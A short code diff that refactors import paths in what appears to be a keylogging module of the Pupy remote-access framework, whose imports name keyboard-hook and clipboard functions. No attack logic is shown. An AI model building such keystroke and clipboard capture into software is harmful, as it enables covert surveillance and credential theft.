@@ -38,7 +38,7 @@ from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
 
-import pupy
+import pupy.agent
 import sys
 
 import datetime
@@ -55,7 +55,7 @@ from .hookfuncs import (
     ToUnicodeEx, ToAsciiEx, get_current_process, get_clipboard
 )
 
-from network.lib.convcompat import as_unicode_string
+from pupy.network.lib.convcompat import as_unicode_string
 
 if sys.version_info.major > 2:
     unicode = str
